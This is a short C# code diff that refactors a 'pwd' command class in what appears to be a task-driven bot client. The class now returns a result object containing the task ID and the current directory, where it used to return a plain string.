@@ -9,9 +9,14 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "pwd";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
-            return "Current directory: " + Directory.GetCurrentDirectory();
+
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = "Current directory: " + Directory.GetCurrentDirectory()
+            };
         }
     }
 }
